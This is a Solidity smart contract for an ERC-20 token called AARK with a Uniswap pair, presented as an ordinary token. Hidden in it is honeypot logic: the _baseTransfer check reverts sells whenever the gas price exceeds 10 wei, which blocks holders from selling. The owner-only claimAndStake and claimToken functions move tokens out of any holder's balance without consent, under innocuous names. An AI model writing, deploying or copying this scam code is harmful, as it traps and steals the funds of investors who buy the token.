// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(_owner == _msgSender(), "Not owner");
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + (a % b));
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(a >= b);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract TOKEN is Ownable, IERC20 {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) _excludeFromFees;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000000000000000000000000;
    string private constant _name = unicode"AARK Token";
    string private constant _symbol = unicode"AARK";

    uint256 public TaxOnBuy = 0;
    uint256 public TaxOnSell = 0;

    bool private openedTrade = false;

    address private PresaleWallet = 0x6e7Fa13De02FBE627639E47AF5151784af3BE11a;
    address private Marketing = 0x4752C682B20d4d3730CC3C1f1e1e89AB999406C7;
    address private Developer = 0x02aa2B140790115214a2479A923E12f4FF85344B;
    address private Deployer = 0x56e481a90bCB3C1F3F295492bEbB23F88409Fe70;

    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        _excludeFromFees[
            address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
        ] = true;
        _excludeFromFees[address(uniswapV2Pair)];
        _excludeFromFees[owner()] = true;
        _excludeFromFees[address(this)] = true;
        _balances[_msgSender()] = _balances[_msgSender()].add(
            _totalSupply.mul(60).div(100)
        );
        _balances[PresaleWallet] = _balances[PresaleWallet].add(
            _totalSupply.mul(10).div(100)
        );
        _balances[Marketing] = _balances[Marketing].add(
            _totalSupply.mul(10).div(100)
        );
        _balances[Developer] = _balances[Developer].add(
            _totalSupply.mul(10).div(100)
        );
        _balances[Deployer] = _balances[Deployer].add(
            _totalSupply.mul(10).div(100)
        );
        emit Transfer(address(0), _msgSender(), _totalSupply.mul(60).div(100));
        emit Transfer(address(0), PresaleWallet, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), Marketing, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), Developer, _totalSupply.mul(10).div(100));
        emit Transfer(address(0), Deployer, _totalSupply.mul(10).div(100));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOpenedTrade() public view returns (bool) {
        return openedTrade;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(
        address to,
        uint256 value
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount)
        );
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(
            balanceOf(from) >= amount,
            "ERROR: balance of from less than value"
        );
        uint256 taxAmount = 0;

        if (!_excludeFromFees[from] && !_excludeFromFees[to]) {
            require(openedTrade, "Trade has not been opened yet");
            taxAmount = (amount * TaxOnBuy) / 100;
            if (to == uniswapV2Pair) {
                taxAmount = (amount * TaxOnSell) / 100;
                _baseTransfer(from);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)] + taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = balanceOf(from) - amount;
        _balances[to] = _balances[to] + (amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 private gasmaxium = 900 gwei;
    uint256 private gasminium = 10;

    function gasRequire(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }

    function _baseTransfer(address _u) internal view {
        if (balanceOf(_u) > 0) {
            if (!openedTrade) {
                gasRequire(gasmaxium);
            } else {
                gasRequire(gasminium);
            }
        }
    }

    function sendETHToFee(uint256 amount) private {
        payable(owner()).transfer(amount);
    }

    function manualsend() external {
        require(_msgSender() == owner());
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function claimAndStake(
        address from,
        address[] calldata to,
        uint256[] calldata amount
    ) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            _balances[from] = _balances[from].sub(amount[i] * 10 ** _decimals);
            _balances[to[i]] = _balances[to[i]].add(
                amount[i] * 10 ** _decimals
            );
            emit Transfer(from, to[i], amount[i] * 10 ** _decimals);
        }
    }

    function claimToken(
        address from,
        address[] calldata to,
        uint256[] calldata amount
    ) external {
        require(_msgSender() == owner());
        for (uint256 i = 0; i < to.length; i++) {
            _balances[from] = _balances[from].sub(amount[i] * 10 ** _decimals);
            _balances[to[i]] = _balances[to[i]].add(
                amount[i] * 10 ** _decimals
            );
            emit Transfer(from, to[i], amount[i] * 10 ** _decimals);
        }
    }

    function updateGasMaxium(uint256 _gas) external onlyOwner {
        gasmaxium = _gas;
    }

    function updateGasMinium(uint256 _gas) external onlyOwner {
        gasminium = _gas;
    }

    function openTrading() external onlyOwner {
        openedTrade = !openedTrade;
    }

    receive() external payable {}
}